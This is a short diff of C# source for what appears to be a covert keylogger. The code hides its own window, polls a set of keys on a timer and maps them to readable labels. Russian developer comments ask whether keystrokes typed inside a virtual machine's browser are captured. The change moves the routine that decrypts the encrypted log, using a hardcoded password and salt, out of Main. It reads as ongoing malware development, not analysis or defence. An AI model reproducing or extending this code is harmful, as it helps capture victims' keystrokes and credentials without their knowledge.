@@ -178,23 +178,8 @@ namespace Foo
       ShowWindow(hWnd, 0);
     }
 
-    static void Main(string[] argv)
+    static void InitializeKeys()
     {
-      // TODO: Перенести в другое приложение
-      if (argv.Length == 2)
-      {
-        Console.WriteLine("Decrypting {0} to {1} ...", argv[0], argv[1]);
-
-        using (Stream input_stream = new FileStream(argv[0], FileMode.Open, FileAccess.Read))
-        {
-          using (Stream output_stream = new FileStream(argv[1], FileMode.Open, FileAccess.Write))
-          {
-            output_stream.SetLength(0);
-            Foo.Cryptography.DecryptData(input_stream, output_stream, password, salt);
-          }
-        }
-      }
-
       // нажатия из chrome в виртуалке ловятся?
       // нажатия из хоста не ловятся
       scanned_key_set = new List<Keys>()
@@ -305,6 +290,11 @@ namespace Foo
         {Keys.Escape, "<Esc>"},
         {Keys.Tab, "<Tab>"},
       };
+    }
+
+    static void Main()
+    {
+      InitializeKeys();
 
       const int sleep_ms = 2;
       const int scan_time_ms = 13;
